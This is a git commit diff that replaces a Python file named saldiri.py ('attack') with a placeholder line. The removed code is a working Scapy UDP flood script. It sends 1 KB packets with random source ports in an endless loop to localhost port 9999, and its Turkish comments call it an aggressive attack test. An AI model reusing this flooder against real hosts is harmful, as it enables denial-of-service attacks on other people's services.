e98b8209fc51a82cf41fd41f5b6657070f9228b8
Safak993 <miracefendiyilmaz92371@gmail.com>
2026-04-05 22:12:51 +0300

    Update saldiri.py

--- ML/BirlesikProjeler/saldiri.py
+++ ML/BirlesikProjeler/saldiri.py
@@ -1,14 +1,1 @@
-from scapy.all import IP, UDP, Raw, send
-import random
-
-target = "127.0.0.1"
-port = 9999
-data = "X" * 1024 # Paket boyutunu büyüt (1 KB)
-
-print("🔥 AGRESİF saldırı testi başlatıldı...")
-
-# Hiç bekleme yapmadan sonsuz döngü
-while True:
-    # Rastgele kaynak portu kullanarak daha gerçekçi bir flood yapalım
-    pkt = IP(dst=target)/UDP(sport=random.randint(1024, 65535), dport=port)/Raw(load=data)
-    send(pkt, verbose=False)
+##
